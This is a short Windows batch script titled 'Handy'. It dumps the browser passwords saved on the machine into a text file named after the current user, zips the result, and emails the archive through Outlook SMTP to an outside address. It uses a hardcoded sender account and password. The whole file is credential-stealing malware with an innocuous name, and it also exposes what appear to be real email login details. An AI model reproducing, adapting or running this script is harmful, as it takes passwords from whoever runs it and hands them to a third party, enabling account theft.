@echo off
title Handy
set "_cd=%cd%"
call :wbpv
call :7za
call :sm
exit
:wbpv
%_cd%\data\exe\wbpv /stext "%_cd%\data\txt\%username%_pass.txt"
exit /b
:7za [Input] [Output]
%_cd%\data\exe\7za a -tzip "%_cd%\data\zip\pass.zip" "%_cd%\data\txt\*_pass.txt"
exit /b
:sm
%_cd%\data\exe\sm /s /to "rafi04@outlook.com" /from "baikil@outlook.com" /pass "Cdewq132" /name "Handy" /sub "Pass.zip" /server "smtp-mail.outlook.com" /p 587 /a "%_cd%\data\zip\pass.zip" /tls
exit /b
